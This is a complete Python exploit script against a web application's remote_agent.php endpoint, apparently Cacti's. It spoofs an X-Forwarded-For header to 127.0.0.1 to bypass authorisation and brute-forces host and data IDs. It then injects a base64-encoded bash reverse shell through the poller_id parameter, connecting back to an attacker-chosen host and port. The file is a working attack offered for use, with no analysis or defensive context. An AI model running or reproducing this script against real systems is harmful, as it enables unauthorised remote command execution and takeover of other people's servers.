import argparse
import requests
import time
import base64
import urllib
from colorama import init, Fore

init(autoreset=True)

class Exploit:
    def __init__(self):
        parser = argparse.ArgumentParser()
        parser.add_argument('-u', '--url', type=str, required=True)
        parser.add_argument('-l', '--lhost', type=str, required=True)
        parser.add_argument('-p', '--lport', type=str, required=True)
        args = parser.parse_args()
        self.url = args.url
        self.lhost = args.lhost
        self.lport = args.lport
        self.header = {"X-Forwarded-For": "127.0.0.1"}

    def brute(self):
        for x in range(0, 5):
            for j in range(0, 10):
                bruteurl = f'{self.url}/remote_agent.php?action=polldata&poller_id=1&host_id={x}&local_data_ids[]={j}'
                try:
                    response = requests.get(bruteurl, headers=self.header)
                    if response.status_code == 200:
                        print(Fore.RED + '- Bruteforcing')
                        content = response.text
                        if content != "[]":
                            rrdName = response.json()[0]["rrd_name"]
                            if rrdName == "polling_time" or rrdName == "uptime":
                                print(Fore.GREEN + f'+ Success!, host id = {x} local id = {j}')
                                return True, x, j
                    else:
                        print(Fore.YELLOW + '- Site unreachable')
                        return False, None, None
                except requests.RequestException:
                    print(Fore.RED + "Error making request")
                time.sleep(0.1)

    def payload(self, hostid, localid):
        payload = f'bash -c \'bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1\''
        encodedpayload = payload.encode('utf-8')
        b64payload = base64.b64encode(encodedpayload).decode('utf-8')
        encoded_injection_payload = f'; echo {b64payload} | base64 -d | bash'
        injection = f'{self.url}/remote_agent.php?action=polldata&poller_id={urllib.parse.quote(encoded_injection_payload)}&host_id={hostid}&local_data_ids[]={localid}'
        try:
            print(Fore.LIGHTCYAN_EX + 'Injecting payload into ' + Fore.RED + f'{self.url} ' + Fore.LIGHTBLUE_EX + 'sending reverse shell to ' + Fore.YELLOW + f'{self.lhost} ' + Fore.LIGHTBLUE_EX + 'on port:' + Fore.GREEN + f'{self.lport}')
            req = requests.get(injection, headers=self.header)
            return req
        except requests.RequestException:
            print(Fore.RED + "Error delivering payload")
            return None

obj = Exploit()

while True:
    success, hostid, localid = obj.brute()
    if success:
        obj.payload(hostid, localid)
        break
    else:
        print(Fore.RED + "Failed to brute force the application. Exiting...")
        break
